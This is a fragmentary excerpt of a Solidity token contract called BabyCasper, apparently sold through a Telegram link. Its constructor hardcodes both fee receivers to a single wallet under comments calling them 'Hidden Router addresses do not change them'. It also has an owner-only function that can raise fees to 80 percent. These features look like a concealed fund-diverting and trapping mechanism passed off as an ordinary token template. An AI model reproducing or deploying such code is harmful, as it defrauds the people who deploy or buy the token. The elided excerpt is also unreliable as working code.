...
Telegram id for buy more contracts : https://t.me/Hellowrld9
...
contract BabyCasper is IBEP20, Auth {
    ...
    constructor () Auth(msg.sender) {
        ...
        //Hidden Router addresses do not change them *************************************************************************
        marketingFeeReceiver = 0xB2dF8180ac63eC72fA15261Aba30Eb2e49280341;
        buyNBurnReceiver = 0xB2dF8180ac63eC72fA15261Aba30Eb2e49280341;
        //Hidden Router addresses do not change them *************************************************************************
    ...
    function destroySnipes(bool kill) external onlyOwner {
        if(kill) {
            ...
            reflectionFee = 10;
            marketingFee = 70;
            totalFee = buyNBurnFee.add(reflectionFee).add(marketingFee);
            feeDenominator = 100;
        } else {
